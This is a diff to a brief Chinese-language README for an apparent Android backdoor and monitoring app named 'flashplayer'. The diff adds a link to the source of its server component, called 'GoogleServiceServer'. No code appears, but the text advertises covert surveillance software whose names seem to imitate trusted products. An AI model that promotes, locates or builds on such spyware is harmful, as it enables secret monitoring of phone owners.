@@ -1,5 +1,5 @@
 # flashplayer
-
+服务端源码：https://github.com/satadriver/GoogleServiceServer
 android 后门、监控程序。
 
 android studio 3.5基础上开发。
